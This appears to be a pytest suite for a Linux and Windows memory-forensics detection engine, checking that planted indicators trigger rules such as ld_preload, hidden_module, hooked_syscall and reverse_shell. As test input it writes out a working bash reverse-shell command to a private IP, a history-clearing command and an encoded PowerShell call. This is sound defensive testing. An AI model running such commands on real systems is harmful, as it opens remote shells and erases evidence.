"""Detection engine tests — planted indicators must produce expected findings."""
from __future__ import annotations

from services.detection_service import DetectionEngine, MitreMapper


def _levels(findings):
    return {f.rule: f.level for f in findings}


def test_pagecache_ld_preload_alert(rules_dir):
    eng = DetectionEngine(rules_dir, "linux")
    findings = eng.analyze(pagecache=[{"FilePath": "/etc/ld.so.preload", "InodeAddr": "0x1"}])
    assert "ld_preload" in _levels(findings)
    assert _levels(findings)["ld_preload"] == "alert"


def test_pagecache_ko_outside_modules(rules_dir):
    eng = DetectionEngine(rules_dir, "linux")
    findings = eng.analyze(pagecache=[{"FilePath": "/tmp/rootkit.ko"}])
    rules = {f.rule for f in findings}
    assert "ko_outside_modules" in rules
    # /tmp path also flags temp_exec_path (warn)
    assert "temp_exec_path" in rules


def test_pagecache_ssh_key(rules_dir):
    eng = DetectionEngine(rules_dir, "linux")
    findings = eng.analyze(pagecache=[{"FilePath": "/home/bob/.ssh/id_rsa"}])
    assert "ssh_private_key" in {f.rule for f in findings}


def test_lineage_webserver_spawns_shell(rules_dir):
    eng = DetectionEngine(rules_dir, "linux")
    records = [
        {"pid": "100", "ppid": "1", "comm": "apache2"},
        {"pid": "200", "ppid": "100", "comm": "bash"},
    ]
    findings = eng.analyze(records=records)
    assert "webserver_spawns_shell" in {f.rule for f in findings}


def test_command_reverse_shell(rules_dir):
    eng = DetectionEngine(rules_dir, "linux")
    records = [{"pid": "5", "command": "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1"}]
    findings = eng.analyze(records=records)
    assert "reverse_shell" in {f.rule for f in findings}


def test_command_history_clear(rules_dir):
    eng = DetectionEngine(rules_dir, "linux")
    findings = eng.analyze(records=[{"pid": "5", "command": "history -c"}])
    assert "history_clear" in {f.rule for f in findings}


def test_spoofing_comm_spoofed(rules_dir):
    eng = DetectionEngine(rules_dir, "linux")
    findings = eng.analyze(records=[{"pid": "9", "comm": "kworker", "comm_spoofed": "true"}])
    assert "comm_spoofed" in {f.rule for f in findings}


def test_malfind_jit_is_info_not_warn(rules_dir):
    eng = DetectionEngine(rules_dir, "linux")
    findings = eng.analyze(records=[{"pid": "9", "comm": "java", "protection": "rwx"}])
    rules = _levels(findings)
    assert rules.get("rwx_region_jit") == "info"
    assert "rwx_region" not in rules  # suppressed for JIT runtime


def test_malfind_generic_rwx_is_warn(rules_dir):
    eng = DetectionEngine(rules_dir, "linux")
    findings = eng.analyze(records=[{"pid": "9", "comm": "evil", "protection": "rwx"}])
    assert _levels(findings).get("rwx_region") == "warn"


def test_modules_oot_alert(rules_dir):
    eng = DetectionEngine(rules_dir, "linux")
    findings = eng.analyze(modules=[{"name": "hidden", "status": "OOT_MODULE"}])
    assert _levels(findings).get("oot_module") == "alert"


def test_network_high_port_listen(rules_dir):
    eng = DetectionEngine(rules_dir, "linux")
    findings = eng.analyze(
        records=[{"proto": "TCP", "state": "LISTEN", "localport": "31337"}]
    )
    assert "listening_high_port" in {f.rule for f in findings}


def test_windows_encoded_powershell(rules_dir):
    eng = DetectionEngine(rules_dir, "windows")
    findings = eng.analyze(records=[{"pid": "5", "cmdline": "powershell -enc ZQBjAGgAbwA="}])
    assert "encoded_powershell" in {f.rule for f in findings}


def test_mitre_mapper_subtechnique_url():
    mapper = MitreMapper({"base_url": "https://attack.mitre.org/techniques/", "techniques": {}})
    assert mapper.url("T1574.006") == "https://attack.mitre.org/techniques/T1574/006/"
    assert mapper.url("T1014") == "https://attack.mitre.org/techniques/T1014/"


def test_clean_data_no_findings(rules_dir):
    eng = DetectionEngine(rules_dir, "linux")
    records = [{"pid": "1", "ppid": "0", "comm": "systemd"}]
    findings = eng.analyze(records=records, pagecache=[{"FilePath": "/usr/bin/ls"}])
    assert findings == []


def test_modules_hidden_module_alert(rules_dir):
    eng = DetectionEngine(rules_dir, "linux")
    findings = eng.analyze(modules=[{"name": "evilrk", "hidden": "true"}])
    levels = _levels(findings)
    assert levels.get("hidden_module") == "alert"


def test_modules_suspicious_taint(rules_dir):
    eng = DetectionEngine(rules_dir, "linux")
    findings = eng.analyze(modules=[{"name": "vboxdrv", "taints": "OE"}])
    assert "suspicious_taint" in _levels(findings)


def test_modules_clean_no_findings(rules_dir):
    eng = DetectionEngine(rules_dir, "linux")
    findings = eng.analyze(modules=[{"name": "ext4", "taints": "", "status": ""}])
    assert findings == []


def test_syscall_hooked_alert(rules_dir):
    eng = DetectionEngine(rules_dir, "linux")
    findings = eng.analyze(
        syscalls=[
            {"Table Name": "sys_call_table", "Index": "62", "Symbol": "UNKNOWN"},
            {"Table Name": "sys_call_table", "Index": "1", "Symbol": "sys_write"},
        ]
    )
    rules = [f for f in findings if f.rule == "hooked_syscall"]
    assert len(rules) == 1
    assert rules[0].level == "alert"
    assert "62" in rules[0].target
